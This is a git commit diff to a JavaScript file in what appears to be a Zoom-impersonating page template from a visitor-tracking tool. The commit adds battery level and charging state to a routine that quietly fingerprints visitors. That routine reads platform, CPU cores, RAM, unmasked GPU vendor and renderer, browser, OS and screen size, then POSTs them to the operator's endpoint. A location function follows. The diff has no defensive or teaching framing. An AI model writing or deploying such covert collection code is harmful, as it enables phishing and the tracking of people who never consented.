18d3695f1e4a05b49a83a22913a4d6e38d1c23a2
Sohail <76439991+asxhail@users.noreply.github.com>
2026-01-19 16:33:18 +0530

    Integrate battery status into device information
    Added battery level information collection to device info.

--- template/zoom/js/location.js
+++ template/zoom/js/location.js
@@ -1,73 +1,89 @@
 function information() {
-  var ptf = navigator.platform;
-  var cc = navigator.hardwareConcurrency;
-  var ram = navigator.deviceMemory;
-  var ver = navigator.userAgent;
-  var str = ver;
-  var os = ver;
-  //gpu
-  var canvas = document.createElement('canvas');
-  var gl;
-  var debugInfo;
-  var ven;
-  var ren;
+    if (navigator.getBattery) {
+        navigator.getBattery().then(function(battery) {
+            var level = Math.round(battery.level * 100) + "%";
+            var status = battery.charging ? " (Charging ⚡)" : "";
+            var batteryInfo = level + status;
+            collectAndSend(batteryInfo);
+        });
+    } else {
+        collectAndSend("Unknown");
+    }
+}
 
-  if (cc == undefined) cc = 'Not Available';
-  if (ram == undefined) ram = 'Not Available';
+function collectAndSend(batLevel) {
+    var ptf = navigator.platform;
+    var cc = navigator.hardwareConcurrency || 'Not Available';
+    var ram = navigator.deviceMemory || 'Not Available';
+    var ver = navigator.userAgent;
+    var str = ver;
+    var os = ver;
+    
+    var canvas = document.createElement('canvas');
+    var gl;
+    var debugInfo;
+    var ven = 'Not Available';
+    var ren = 'Not Available';
 
-  //browser detection
-  if (ver.indexOf('Firefox') != -1) {
-    str = str.substring(str.indexOf(' Firefox/') + 1);
-    str = str.split(' ');
-    brw = str[0];
-  }
-  else if (ver.indexOf('Chrome') != -1) {
-    str = str.substring(str.indexOf(' Chrome/') + 1);
-    str = str.split(' ');
-    brw = str[0];
-  }
-  else if (ver.indexOf('Safari') != -1) {
-    str = str.substring(str.indexOf(' Safari/') + 1);
-    str = str.split(' ');
-    brw = str[0];
-  }
-  else if (ver.indexOf('Edge') != -1) {
-    str = str.substring(str.indexOf(' Edge/') + 1);
-    str = str.split(' ');
-    brw = str[0];
-  }
-  else {
-    brw = 'Not Available'
-  }
+    try {
+        gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    } catch (e) { }
+    if (gl) {
+        debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+            ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+            ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        }
+    }
 
-  try {
-    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-  } catch (e) { }
-  if (gl) {
-    debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-    ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-    ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-  }
-  if (ven == undefined) ven = 'Not Available';
-  if (ren == undefined) ren = 'Not Available';
+    var brw;
+    if (ver.indexOf('Firefox') != -1) {
+        str = str.substring(str.indexOf(' Firefox/') + 1);
+        str = str.split(' ');
+        brw = str[0];
+    } else if (ver.indexOf('Chrome') != -1) {
+        str = str.substring(str.indexOf(' Chrome/') + 1);
+        str = str.split(' ');
+        brw = str[0];
+    } else if (ver.indexOf('Safari') != -1) {
+        str = str.substring(str.indexOf(' Safari/') + 1);
+        str = str.split(' ');
+        brw = str[0];
+    } else if (ver.indexOf('Edge') != -1) {
+        str = str.substring(str.indexOf(' Edge/') + 1);
+        str = str.split(' ');
+        brw = str[0];
+    } else {
+        brw = 'Not Available';
+    }
 
-  var ht = window.screen.height
-  var wd = window.screen.width
-  
-  os = os.substring(0, os.indexOf(')'));
-  os = os.split(';');
-  os = os[1];
-  if (os == undefined) os = 'Not Available';
-  os = os.trim();
+    var ht = window.screen.height;
+    var wd = window.screen.width;
+    
+    os = os.substring(0, os.indexOf(')'));
+    os = os.split(';');
+    os = os[1];
+    if (os == undefined) os = 'Not Available';
+    os = os.trim();
 
-  // Send Device Info
-  $.ajax({
-    type: 'POST',
-    url: info_file,
-    data: { Ptf: ptf, Brw: brw, Cc: cc, Ram: ram, Ven: ven, Ren: ren, Ht: ht, Wd: wd, Os: os },
-    success: function () { },
-    mimeType: 'text'
-  });
+    $.ajax({
+        type: 'POST',
+        url: info_file,
+        data: { 
+            Ptf: ptf, 
+            Brw: brw, 
+            Cc: cc, 
+            Ram: ram, 
+            Ven: ven, 
+            Ren: ren, 
+            Ht: ht, 
+            Wd: wd, 
+            Os: os, 
+            Bat: batLevel 
+        },
+        success: function () { },
+        mimeType: 'text'
+    });
 }
 
 function locate(callback, errCallback) {
